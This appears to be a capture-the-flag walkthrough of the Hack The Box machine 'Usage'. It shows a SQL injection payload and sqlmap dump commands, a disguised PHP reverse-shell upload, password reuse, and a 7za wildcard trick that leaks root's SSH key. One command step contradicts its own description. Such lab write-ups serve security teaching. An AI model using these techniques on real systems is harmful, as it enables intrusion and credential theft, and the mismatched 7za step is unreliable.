---
title: Usage
date: 2026-10-03
description: Medium Linux box sqlmap-injecting the forgot-password email field for admin creds, uploading a disguised revshell through a Laravel file upload bug, and abusing a 7za wildcard symlink in usage_management for root's key.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

```sh
Nmap scan report for 10.10.11.18
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
```

Got a sub-domain -> `admin.usage.htb`

Sub-directories:
- `/register`
- `/login`
- `/forgot-password`

Register new user and login as the user:
- nothing interesting

Exploring the forgot password page which requires email:
- valid email - works (Msg: link sent to mail)
- Non-valid email - error

Try playing with the input field (email field):
- Use `'` on every input field to check for a **server error 500** 

Guess the syntax works like this:

```
select * from users where email = '{my input}';
```

```
select * from users where email = '' or 1=1;-- -';
```

On `/forgot-password` the **email field** is vulnerable to **sqli**

Grab the request and use **sqlmap**:

```sh
sqlmap -r request.txt -p email --batch --level=5 --risk=3 --threads=10 --dbs
```

- `usage_blog`

```sh
sqlmap -r request.txt -p email --batch --level=5 --risk=3 --threads=10 -D usage_blog --tables
```

- `admin_users`

```sh
sqlmap -r request.txt -p email --batch --level=5 --risk=3 --threads=10 -D usage_blog -T admin_users --dump
```

- We gained the **password** hash of the admin user
- Cracked the password using hashcat

> `Administrator - whatever1`

Login as admin on `http://admin.usage.htb`

We got the versions of installed packages and dependency -> **Laravel version 10.18.0** 

> CVE-2023-24249 : https://nvd.nist.gov/vuln/detail/cve-2023-24249
> Reference : https://github.com/advisories/GHSA-g857-47pm-3r32

# User

- Upload a php revshell with content named as image

Gained shell as user **dash**

On the home directory of dash there's a **hidden** file **monitrc**

> Monit is a small Open Source utility for managing and monitoring Unix systems. Monit conducts automatic maintenance and repair and can execute meaningful causal actions in error situations.

By reviewing `.monitrc`, we saw creds `admin - 3nc0d3d_pa$$w0rd`

Reuse the password for the other user xander and it worked:

> `xander - 3nc0d3d_pa$$w0rd`

Gained shell as user **xander** 

# Root

```sh
sudo -l

(ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

- Looks like a linux executable file:

```sh
file /usr/bin/usage_management
```

- Copy the hash value and search on the **virus total** site to check for submission:

```sh
md5sum /usr/bin/usage_management
```

Running the binary offers three options:
- Project backup
- Backup MySQL data
- Reset admin password

```sh
strings /usr/bin/usage_management
```

```output
...<SNIP>...
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):  
Invalid choice.
...<SNIP>...
```

- Looks like option 1 changes into `/var/www/html` 

By looking at the strings we understood there's an error handling function:

- The `7za` runs (if an error didn't occur) to create a file `/var/backups`
	- `-snl` -> means to store links as links

- So we can't just write a link to `/root` into `/var/www/html`


Exploit:
wildcards (`*`) in commands are often dangerous. Searching for "**7za** wildcard exploit":

> reference: https://hacktricks.wiki/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.html?highlight=7z#7-zip--7z--7za

The attack is to create a file named `@whatever`, and then another one named `whatever` that is a symbolic link to the file we want to read.

```sh
cd /var/www/html

touch dante; ln -fs /root/.ssh/id_rsa dante 
```

```
sudo usage_management
```

```output 
Scanning the drive:
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----

WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi

...<SNIP>...

WARNING: No more files
-----END OPENSSH PRIVATE KEY-----
```


Remove the "No more files" messages from each line.

Gained `root`
